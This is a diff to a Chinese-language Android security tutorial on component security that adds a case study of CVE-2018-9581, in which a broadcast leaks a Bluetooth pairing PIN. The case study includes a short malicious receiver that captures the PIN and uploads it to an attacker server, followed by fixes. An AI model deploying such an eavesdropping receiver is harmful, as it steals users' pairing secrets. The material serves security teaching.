@@ -1,4 +1,4 @@
-# 四大组件安全
+# 1x04 - 四大组件安全
 
 四大组件是“应用能力的边界定义”：哪些能力对外开放、以什么身份执行、以及外部输入如何进入应用逻辑。
 
@@ -138,9 +138,59 @@ ContentProvider 是共享数据的核心。常见配置链路是：
 - 用最小输入触发入口 → 观察 logcat/dumpsys → 再逐步增加攻击载荷
 - 重点记录：入口是否可达、是否校验 caller、是否发生身份切换、最终敏感操作点在哪里
 
-## 8. CVE 案例（典型类型）
+## 8. CVE 案例分析：CVE-2018-9581 (Broadcast 信息泄露)
 
-- **CVE-2018-9581**：Broadcast 信息泄露。系统广播包含敏感信息且缺少权限保护，导致第三方应用可监听。
+### 8.1 漏洞背景
+
+该漏洞存在于 Android Settings 应用的蓝牙配对流程中。
+
+### 8.2 漏洞原理
+
+在 Android 8.x 及以下版本中，当用户进行蓝牙设备配对时，Settings 应用会发送一个包含配对 PIN 码的广播：
+
+```java
+// Settings 中的问题代码（简化）
+Intent intent = new Intent("android.bluetooth.device.action.PAIRING_REQUEST");
+intent.putExtra("android.bluetooth.device.extra.PAIRING_KEY", pinCode);  // 敏感信息！
+intent.putExtra("android.bluetooth.device.extra.DEVICE", device);
+sendBroadcast(intent);  // 没有指定权限保护！
+```
+
+由于该广播是**隐式广播**且未添加权限保护，任何应用只需要注册对应的 Receiver 即可接收到 PIN 码。
+
+### 8.3 攻击演示
+
+```java
+// 恶意应用的 Manifest
+<receiver android:name=".BluetoothSpyReceiver" android:exported="true">
+    <intent-filter>
+        <action android:name="android.bluetooth.device.action.PAIRING_REQUEST" />
+    </intent-filter>
+</receiver>
+
+// Receiver 实现
+public class BluetoothSpyReceiver extends BroadcastReceiver {
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        String pinCode = intent.getStringExtra("android.bluetooth.device.extra.PAIRING_KEY");
+        // 将 PIN 码上传到攻击者服务器
+        uploadToServer(pinCode);
+    }
+}
+```
+
+攻击者无需任何权限即可窃取蓝牙配对密钥。
+
+### 8.4 修复方案
+
+1. **添加权限保护**：
+   ```java
+   sendBroadcast(intent, "android.permission.BLUETOOTH_PRIVILEGED");  // 仅系统应用可接收
+   ```
+
+2. **使用显式广播**：将广播发送给特定的系统组件，而非全局广播。
+
+3. **迁移到 LocalBroadcastManager**：对于应用内部通信，使用本地广播避免跨应用泄露。
 
 ## 参考（AOSP）
 
